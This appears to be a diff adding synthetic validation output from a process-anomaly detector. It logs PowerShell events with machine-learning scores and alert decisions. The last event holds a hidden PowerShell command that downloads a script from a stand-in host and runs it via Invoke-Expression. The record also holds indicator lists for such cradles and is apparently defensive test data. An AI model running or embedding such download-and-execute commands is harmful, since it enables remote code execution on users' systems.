+            "feature_count": 19,
+            "decision_score": 0.05421925,
+            "raw_score": -0.44578075,
+            "model_prediction": 1,
+            "model_outlier": false,
+            "anomaly_confidence": 26.48,
+            "anomaly_label": "NORMAL",
+            "severity": "INFO",
+            "should_alert": false,
+            "feature_deviations": [
+              {
+                "feature": "is_script_interpreter",
+                "value": 1.0,
+                "baseline_mean": 0.0281,
+                "baseline_std": 0.1653,
+                "deviation_std": 5.8789
+              },
+              {
+                "feature": "num_handles",
+                "value": 120.0,
+                "baseline_mean": 464.0356,
+                "baseline_std": 579.8446,
+                "deviation_std": 0.5933
+              },
+              {
+                "feature": "is_system_path",
+                "value": 1.0,
+                "baseline_mean": 0.8592,
+                "baseline_std": 0.3478,
+                "deviation_std": 0.4049
+              },
+              {
+                "feature": "executable_path_depth",
+                "value": 6.0,
+                "baseline_mean": 5.2652,
+                "baseline_std": 2.0635,
+                "deviation_std": 0.3561
+              },
+              {
+                "feature": "is_user_profile_path",
+                "value": 0.0,
+                "baseline_mean": 0.0874,
+                "baseline_std": 0.2824,
+                "deviation_std": 0.3094
+              }
+            ],
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "autoencoder": {
+            "available": true,
+            "model_name": "sentinelx_process_autoencoder",
+            "model_version": "v2",
+            "hidden_activation": "tanh",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "reconstruction_error": 0.0759346849,
+            "reconstruction_region": "NORMAL_BASELINE",
+            "anomaly_confidence": 37.0,
+            "anomaly_label": "NORMAL",
+            "severity": "INFO",
+            "candidate_alert": false,
+            "embedding_dimension": 4,
+            "behavior_embedding": [
+              0.96303693,
+              0.73826246,
+              0.95507899,
+              0.40577308
+            ],
+            "feature_reconstruction_errors": [
+              {
+                "feature": "command_arg_count",
+                "actual_value": 4.0,
+                "reconstructed_value": 10.934276,
+                "scaled_squared_error": 0.66461815,
+                "absolute_original_difference": 6.934276
+              },
+              {
+                "feature": "num_handles",
+                "actual_value": 120.0,
+                "reconstructed_value": 564.330665,
+                "scaled_squared_error": 0.48270603,
+                "absolute_original_difference": 444.330665
+              },
+              {
+                "feature": "command_line_length",
+                "actual_value": 62.0,
+                "reconstructed_value": 239.173049,
+                "scaled_squared_error": 0.18030072,
+                "absolute_original_difference": 177.173049
+              },
+              {
+                "feature": "num_threads",
+                "actual_value": 8.0,
+                "reconstructed_value": 12.711534,
+                "scaled_squared_error": 0.04064242,
+                "absolute_original_difference": 4.711534
+              },
+              {
+                "feature": "memory_percent",
+                "actual_value": 0.2,
+                "reconstructed_value": 0.319239,
+                "scaled_squared_error": 0.03274479,
+                "absolute_original_difference": 0.119239
+              }
+            ],
+            "calibration": {
+              "p50": 0.01421417566516108,
+              "p90": 0.08318183402218673,
+              "p95": 0.1278470974946212,
+              "p97": 0.16416013202775295,
+              "p99": 0.23687126271753484
+            },
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "temporal": {
+            "state": "COLLECTING_HISTORY",
+            "available": true,
+            "depth": 6,
+            "score": null,
+            "severity": null,
+            "label": null,
+            "should_alert": null,
+            "result_id": null
+          },
+          "fusion_version": "v3",
+          "fusion_score": 32.1697,
+          "fusion_severity": "LOW",
+          "fusion_suspicious": false,
+          "fusion_should_alert": false,
+          "primary_engine": "process_threat_fusion_v3"
+        },
+        "file": {},
+        "network": {},
+        "registry": {},
+        "metadata": {
+          "detector_family": "PROCESS",
+          "detector": "POWERSHELL",
+          "scenario_name": "Temporal PowerShell Sequence Step 6",
+          "event_category": "PROCESS",
+          "device_id": "local-device",
+          "data_source": "SYNTHETIC_VALIDATION",
+          "sentinel_runtime_mode": "VALIDATION",
+          "synthetic": true,
+          "scenario_id": "P1-08-S06",
+          "validation_run_id": "SOC-VERTICAL-SLICE-FDB4B65C",
+          "provenance_graph": {
+            "processed": true,
+            "node_count": 3,
+            "edge_count": 2
+          },
+          "correlation_processed": true
+        }
+      },
+      {
+        "event_id": "0a394fb5-9ec1-4084-919d-a9e10940edcf",
+        "event_type": "process_start",
+        "event_category": "PROCESS",
+        "source": "powershell_validation_suite",
+        "severity": "MEDIUM",
+        "timestamp": "2026-10-06T01:41:24.140059+00:00",
+        "timestamp_unix": 1791250884.140059,
+        "device_id": "local-device",
+        "process": {
+          "pid": 992108,
+          "ppid": 991000,
+          "name": "powershell.exe",
+          "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "cmdline": "powershell.exe -WindowStyle Hidden -EncodedCommand SYNTHETIC_TEMPORAL_B",
+          "username": "sentinel-validation",
+          "create_time": 1791250823.2635014,
+          "parent_name": "explorer.exe",
+          "cpu_percent": 0.5,
+          "memory_percent": 0.2,
+          "rss_mb": 45.0,
+          "num_threads": 8,
+          "num_handles": 120,
+          "behavior_score": 50,
+          "behavior_indicators": [
+            "monitored_binary",
+            "command:-encodedcommand",
+            "command:-windowstyle hidden"
+          ],
+          "behavior_reasons": [
+            "Security-relevant Windows utility observed",
+            "Command-line indicator observed: -encodedcommand",
+            "Command-line indicator observed: -windowstyle hidden"
+          ],
+          "statistical_score": 0,
+          "statistical_indicators": [],
+          "isolation_forest": {
+            "available": true,
+            "model_name": "sentinelx_process_isolation_forest",
+            "model_version": "v1",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "decision_score": 0.05396153,
+            "raw_score": -0.44603847,
+            "model_prediction": 1,
+            "model_outlier": false,
+            "anomaly_confidence": 26.54,
+            "anomaly_label": "NORMAL",
+            "severity": "INFO",
+            "should_alert": false,
+            "feature_deviations": [
+              {
+                "feature": "is_script_interpreter",
+                "value": 1.0,
+                "baseline_mean": 0.0281,
+                "baseline_std": 0.1653,
+                "deviation_std": 5.8789
+              },
+              {
+                "feature": "num_handles",
+                "value": 120.0,
+                "baseline_mean": 464.0356,
+                "baseline_std": 579.8446,
+                "deviation_std": 0.5933
+              },
+              {
+                "feature": "is_system_path",
+                "value": 1.0,
+                "baseline_mean": 0.8592,
+                "baseline_std": 0.3478,
+                "deviation_std": 0.4049
+              },
+              {
+                "feature": "executable_path_depth",
+                "value": 6.0,
+                "baseline_mean": 5.2652,
+                "baseline_std": 2.0635,
+                "deviation_std": 0.3561
+              },
+              {
+                "feature": "is_user_profile_path",
+                "value": 0.0,
+                "baseline_mean": 0.0874,
+                "baseline_std": 0.2824,
+                "deviation_std": 0.3094
+              }
+            ],
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "autoencoder": {
+            "available": true,
+            "model_name": "sentinelx_process_autoencoder",
+            "model_version": "v2",
+            "hidden_activation": "tanh",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "reconstruction_error": 0.0640264126,
+            "reconstruction_region": "NORMAL_BASELINE",
+            "anomaly_confidence": 33.72,
+            "anomaly_label": "NORMAL",
+            "severity": "INFO",
+            "candidate_alert": false,
+            "embedding_dimension": 4,
+            "behavior_embedding": [
+              0.96385404,
+              0.73537845,
+              0.95583277,
+              0.40087443
+            ],
+            "feature_reconstruction_errors": [
+              {
+                "feature": "command_arg_count",
+                "actual_value": 5.0,
+                "reconstructed_value": 11.056026,
+                "scaled_squared_error": 0.50692702,
+                "absolute_original_difference": 6.056026
+              },
+              {
+                "feature": "num_handles",
+                "actual_value": 120.0,
+                "reconstructed_value": 540.123261,
+                "scaled_squared_error": 0.43154253,
+                "absolute_original_difference": 420.123261
+              },
+              {
+                "feature": "command_line_length",
+                "actual_value": 71.0,
+                "reconstructed_value": 245.107007,
+                "scaled_squared_error": 0.17411438,
+                "absolute_original_difference": 174.107007
+              },
+              {
+                "feature": "num_threads",
+                "actual_value": 8.0,
+                "reconstructed_value": 11.962308,
+                "scaled_squared_error": 0.02874428,
+                "absolute_original_difference": 3.962308
+              },
+              {
+                "feature": "memory_percent",
+                "actual_value": 0.2,
+                "reconstructed_value": 0.309378,
+                "scaled_squared_error": 0.02755274,
+                "absolute_original_difference": 0.109378
+              }
+            ],
+            "calibration": {
+              "p50": 0.01421417566516108,
+              "p90": 0.08318183402218673,
+              "p95": 0.1278470974946212,
+              "p97": 0.16416013202775295,
+              "p99": 0.23687126271753484
+            },
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "temporal": {
+            "state": "COLLECTING_HISTORY",
+            "available": true,
+            "depth": 7,
+            "score": null,
+            "severity": null,
+            "label": null,
+            "should_alert": null,
+            "result_id": null
+          },
+          "fusion_version": "v3",
+          "fusion_score": 44.1818,
+          "fusion_severity": "MEDIUM",
+          "fusion_suspicious": false,
+          "fusion_should_alert": false,
+          "primary_engine": "process_threat_fusion_v3"
+        },
+        "file": {},
+        "network": {},
+        "registry": {},
+        "metadata": {
+          "detector_family": "PROCESS",
+          "detector": "POWERSHELL",
+          "scenario_name": "Temporal PowerShell Sequence Step 7",
+          "event_category": "PROCESS",
+          "device_id": "local-device",
+          "data_source": "SYNTHETIC_VALIDATION",
+          "sentinel_runtime_mode": "VALIDATION",
+          "synthetic": true,
+          "scenario_id": "P1-08-S07",
+          "validation_run_id": "SOC-VERTICAL-SLICE-FDB4B65C",
+          "provenance_graph": {
+            "processed": true,
+            "node_count": 3,
+            "edge_count": 2
+          },
+          "correlation_processed": true
+        }
+      },
+      {
+        "event_id": "c2f017a5-e431-4e5b-9dbf-7786d37842cc",
+        "event_type": "process_start",
+        "event_category": "PROCESS",
+        "source": "powershell_validation_suite",
+        "severity": "CRITICAL",
+        "timestamp": "2026-10-06T01:41:24.254822+00:00",
+        "timestamp_unix": 1791250884.254822,
+        "device_id": "local-device",
+        "process": {
+          "pid": 992108,
+          "ppid": 991000,
+          "name": "powershell.exe",
+          "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "cmdline": "powershell.exe -WindowStyle Hidden -Command \"[Convert]::FromBase64String('U1lOVEhFVElD') | Out-Null; (New-Object Net.WebClient).DownloadString('https://example.invalid/p.txt') | Invoke-Expression\"",
+          "username": "sentinel-validation",
+          "create_time": 1791250823.2635014,
+          "parent_name": "explorer.exe",
+          "cpu_percent": 0.5,
+          "memory_percent": 0.2,
+          "rss_mb": 45.0,
+          "num_threads": 8,
+          "num_handles": 120,
+          "behavior_score": 100,
+          "behavior_indicators": [
+            "monitored_binary",
+            "command:-windowstyle hidden",
+            "command:downloadstring",
+            "command:frombase64string",
+            "command:invoke-expression",
+            "script_network_reference"
+          ],
+          "behavior_reasons": [
+            "Security-relevant Windows utility observed",
+            "Command-line indicator observed: -windowstyle hidden",
+            "Command-line indicator observed: downloadstring",
+            "Command-line indicator observed: frombase64string",
+            "Command-line indicator observed: invoke-expression",
+            "Script or command interpreter contains a network URL in its command line"
+          ],
+          "statistical_score": 0,
+          "statistical_indicators": [],
+          "isolation_forest": {
+            "available": true,
+            "model_name": "sentinelx_process_isolation_forest",
+            "model_version": "v1",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "decision_score": 0.04416866,
+            "raw_score": -0.45583134,
+            "model_prediction": 1,
+            "model_outlier": false,
+            "anomaly_confidence": 29.06,
+            "anomaly_label": "NORMAL",
+            "severity": "INFO",
+            "should_alert": false,
+            "feature_deviations": [
+              {
+                "feature": "is_script_interpreter",
+                "value": 1.0,
+                "baseline_mean": 0.0281,
+                "baseline_std": 0.1653,
+                "deviation_std": 5.8789
+              },
+              {
+                "feature": "command_arg_count",
+                "value": 11.0,
+                "baseline_mean": 4.2561,
+                "baseline_std": 7.9446,
+                "deviation_std": 0.8489
+              },
+              {
+                "feature": "num_handles",
+                "value": 120.0,
+                "baseline_mean": 464.0356,
+                "baseline_std": 579.8446,
+                "deviation_std": 0.5933
+              },
+              {
+                "feature": "is_system_path",
+                "value": 1.0,
+                "baseline_mean": 0.8592,
+                "baseline_std": 0.3478,
+                "deviation_std": 0.4049
+              },
+              {
+                "feature": "executable_path_depth",
+                "value": 6.0,
+                "baseline_mean": 5.2652,
+                "baseline_std": 2.0635,
+                "deviation_std": 0.3561
+              }
+            ],
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "autoencoder": {
+            "available": true,
+            "model_name": "sentinelx_process_autoencoder",
+            "model_version": "v2",
+            "hidden_activation": "tanh",
+            "schema_version": "process_behavior_v1",
+            "feature_count": 19,
+            "reconstruction_error": 0.0260381658,
+            "reconstruction_region": "NORMAL_BASELINE",
+            "anomaly_confidence": 23.26,
+            "anomaly_label": "NORMAL",
+            "severity": "INFO",
+            "candidate_alert": false,
+            "embedding_dimension": 4,
+            "behavior_embedding": [
+              0.96676387,
+              0.71198495,
+              0.96104361,
+              0.38819172
+            ],
+            "feature_reconstruction_errors": [
+              {
+                "feature": "num_handles",
+                "actual_value": 120.0,
+                "reconstructed_value": 449.628067,
+                "scaled_squared_error": 0.26565532,
+                "absolute_original_difference": 329.628067
+              },
+              {
+                "feature": "command_line_length",
+                "actual_value": 196.0,
+                "reconstructed_value": 307.431693,
+                "scaled_squared_error": 0.07132136,
+                "absolute_original_difference": 111.431693
+              },
+              {
+                "feature": "command_arg_count",
+                "actual_value": 11.0,
+                "reconstructed_value": 12.364482,
+                "scaled_squared_error": 0.0257339,
+                "absolute_original_difference": 1.364482
+              },
+              {
+                "feature": "child_process_count",
+                "actual_value": 0.0,
+                "reconstructed_value": 1.181451,
+                "scaled_squared_error": 0.02171948,
+                "absolute_original_difference": 1.181451
+              },
+              {
+                "feature": "is_user_profile_path",
+                "actual_value": 0.0,
+                "reconstructed_value": 0.044546,
+                "scaled_squared_error": 0.02098558,
+                "absolute_original_difference": 0.044546
+              }
+            ],
+            "calibration": {
+              "p50": 0.01421417566516108,
+              "p90": 0.08318183402218673,
+              "p95": 0.1278470974946212,
+              "p97": 0.16416013202775295,
+              "p99": 0.23687126271753484
+            },
+            "pid": 992108,
+            "process_name": "powershell.exe",
+            "parent_process_name": "explorer.exe",
+            "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "temporal": {
+            "state": "TEMPORAL_INFERENCE_COMPLETE",
+            "available": true,
+            "depth": 8,
+            "score": 100.0,
+            "severity": "HIGH",
+            "label": "HIGH_ANOMALY",
+            "should_alert": true,
+            "result_id": 1
+          },
+          "fusion_version": "v3",
+          "fusion_score": 92.289,
+          "fusion_severity": "CRITICAL",
+          "fusion_suspicious": true,
+          "fusion_should_alert": true,
+          "primary_engine": "process_threat_fusion_v3"
+        },
+        "file": {},
+        "network": {},
+        "registry": {},
+        "metadata": {
+          "detector_family": "PROCESS",
+          "detector": "POWERSHELL",
+          "scenario_name": "Temporal PowerShell Sequence Step 8",
+          "event_category": "PROCESS",
+          "device_id": "local-device",
+          "data_source": "SYNTHETIC_VALIDATION",
+          "sentinel_runtime_mode": "VALIDATION",
+          "synthetic": true,
+          "scenario_id": "P1-08-S08",
+          "validation_run_id": "SOC-VERTICAL-SLICE-FDB4B65C"
+        }
+      }
+    ],
+    "source": "CorrelationManager",
+    "requires_investigation": true,
+    "created_at": "2026-10-06T01:41:24.294394+00:00",
+    "updated_at": "2026-10-06T01:41:24.294394+00:00"
+  },
+  "detector_result": {
+    "rule_score": 100,
+    "temporal": {
+      "state": "TEMPORAL_INFERENCE_COMPLETE",
+      "available": true,
+      "depth": 8,
+      "score": 100.0,
+      "severity": "HIGH",
+      "label": "HIGH_ANOMALY",
+      "should_alert": true,
+      "result_id": 1
+    },
+    "fusion_score": 92.289,
+    "severity": "CRITICAL",
+    "should_alert": true,
+    "stored_detection_count": 1
+  }
+}
